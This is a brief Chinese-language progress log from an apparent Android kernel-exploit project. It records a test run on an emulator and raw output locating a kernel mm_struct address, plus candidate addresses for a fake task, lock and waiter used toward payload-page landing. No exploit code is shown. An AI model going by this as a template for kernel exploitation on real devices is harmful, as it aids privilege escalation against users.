# Discover found mm_struct + Kotlin processor · 2026-10-20 10:38

- 设备：`Pixel_5(AVD) - 13`
- 命令：`./gradlew :app:connectedDebugAndroidTest -Pandroid.testInstrumentationRunnerArguments.class=com.ghostlock.app.DiscoverProbeInstrumentedTest`

## 原始读数

```text
discover-run=Ok(ran=true, verdict=1, refusal=0, found=-549752834048,
  mmStruct=-549752834048, probes=2911, rounds=0, pokes=65536, error=0,
  wordsBase=544213053440, wordsBytes=65536)
discover-processor=Ready(KernelPageAddresses(
  aliasDelta=-1093965936640, pageBase=-549752834048,
  fakeTask=-549752829312, fakeLock=-549752830336,
  waiterWord=-549752829568))
```

## 判读

- `found` = `0xffffff80002d7800`，是 discover 命中的 `mm_struct`；
- `verdict=1` (`ok`)，`probes=2911`，`wordsBase/wordsBytes` 回传；
- `DiscoverProcessor` 按候选公式得到 `pageBase=found`，并生成 canonical fake_task/lock/waiter；
- 这仍不是 page landing：`found` 是 mm_struct，不是已证明的 payload page；processor 只是候选换算。

## 结论

Discover → Kotlin 处理链路已通，能产出候选地址；N3 还需要把候选页与页字节/actor 结果对拍，不能直接声称页落点。
